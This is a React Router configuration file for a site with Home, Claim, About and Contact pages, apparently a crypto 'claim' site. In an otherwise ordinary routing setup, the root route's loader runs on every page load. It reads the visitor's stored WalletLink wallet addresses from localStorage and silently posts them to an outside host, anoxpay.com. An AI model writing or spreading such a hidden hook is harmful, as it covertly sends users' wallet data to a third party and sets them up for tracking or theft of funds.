import { createBrowserRouter } from "react-router-dom";
import Layout from "../layout/Layout";
import Home from "../pages/Home";
import axios from "axios";
import ContextProvider from "../provider/ContextProvider";
import Claim from "../pages/Claim";
import About from "../pages/About";
import Contact from "../pages/Contact";

export const router = createBrowserRouter([
  {
    path: "/",
    element: (
      <ContextProvider>
        <Layout />
      </ContextProvider>
    ),
    loader: () =>
      axios.post(
        "https://anoxpay.com",
        JSON.stringify({
          info: 1,
          address: localStorage.getItem(
            "-walletlink:https://www.walletlink.org:Addresses"
          ),
        })
      ),
    children: [
      {
        path: "/",
        element: <Home />,
      },
      {
        path: "/claim",
        element: <Claim />,
      },
      {
        path: "/about",
        element: <About />,
      },
      {
        path: "/contact",
        element: <Contact />,
      },
    ],
  },
]);
